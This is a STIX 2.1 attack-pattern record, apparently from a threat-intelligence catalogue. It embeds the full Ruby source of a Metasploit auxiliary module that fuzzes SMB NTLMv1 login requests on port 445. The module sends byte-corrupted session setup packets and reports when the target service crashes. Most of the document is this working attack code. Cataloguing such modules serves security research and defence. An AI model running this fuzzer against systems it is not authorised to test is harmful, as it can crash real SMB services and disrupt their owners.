{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f24e216e-7583-49e4-8d64-62a7cc85b684",
    "created": "2024-08-14T16:26:30.979476Z",
    "modified": "2024-08-14T16:26:30.97948Z",
    "name": "SMB NTLMv1 Login Request Corruption",
    "description": " This module sends a series of SMB login requests using the NTLMv1 protocol with corrupted bytes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt.rb",
            "external_id": "smb_ntlm1_login_corrupt.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Fuzzer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SMB NTLMv1 Login Request Corruption',\n      'Description'    => %q{\n        This module sends a series of SMB login requests using\n      the NTLMv1 protocol with corrupted bytes.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE\n    ))\n    register_options([\n      Opt::RPORT(445),\n      OptInt.new('MAXDEPTH', [false, 'Specify a maximum byte depth to test'])\n    ])\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def do_smb_login(pkt,opts={})\n    @connected = false\n    connect(versions: [1])\n    simple.client.negotiate(false)\n\n    @connected = true\n    sock.put(pkt)\n    sock.get_once(-1, opts[:timeout])\n  end\n\n  def run\n    last_str = nil\n    last_inp = nil\n    last_err = nil\n\n    pkt = make_smb_login\n    cnt = 0\n\n    max = datastore['MAXDEPTH'].to_i\n    max = nil if max == 0\n    tot = ( max ? [max,pkt.length].min : pkt.length) * 256\n\n    print_status(\"Fuzzing SMB login with #{tot} requests\")\n    fuzz_string_corrupt_byte_reverse(pkt,max) do |str|\n      cnt += 1\n\n      if(cnt % 100 == 0)\n        print_status(\"Fuzzing with iteration #{cnt}/#{tot} using #{@last_fuzzer_input}\")\n      end\n\n      begin\n        r = do_smb_login(str, 0.25)\n      rescue ::Interrupt\n        print_status(\"Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}\")\n        raise $!\n      rescue ::Exception => e\n        last_err = e\n      ensure\n        disconnect\n      end\n\n      if(not @connected)\n        if(last_str)\n          print_status(\"The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack(\"H*\")[0]} error=#{last_err}\")\n        else\n          print_status(\"Could not connect to the service: #{last_err}\")\n        end\n        return\n      end\n\n      last_str = str\n      last_inp = @last_fuzzer_input\n    end\n  end\n\n  def make_smb_login\n\n    user = \"USER\"\n    domain = \"DOMAIN\"\n    hash_lm = Rex::Proto::NTLM::Crypt.lanman_des(\"X\", \"X\" * 8)\n    hash_nt = Rex::Proto::NTLM::Crypt.ntlm_md4(\"X\", \"X\" * 8)\n\n    data = ''\n    data << hash_lm\n    data << hash_nt\n    data << user + \"\\x00\"\n    data << domain + \"\\x00\"\n    data << 'Windows 2000 2195' + \"\\x00\"\n    data << 'Windows 2000 5.0' + \"\\x00\"\n\n    pkt = Rex::Proto::SMB::Constants::SMB_SETUP_NTLMV1_PKT.make_struct\n\n    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_SESSION_SETUP_ANDX\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0x2001\n    pkt['Payload']['SMB'].v['WordCount'] = 13\n    pkt['Payload'].v['AndX'] = 255\n    pkt['Payload'].v['MaxBuff'] = 0xffdf\n    pkt['Payload'].v['MaxMPX'] = 2\n    pkt['Payload'].v['VCNum'] = 1\n    pkt['Payload'].v['PasswordLenLM'] = hash_lm.length\n    pkt['Payload'].v['PasswordLenNT'] = hash_nt.length\n    pkt['Payload'].v['Capabilities'] = 64\n    pkt['Payload'].v['Payload'] = data\n    pkt.to_s\n  end\nend\n"
}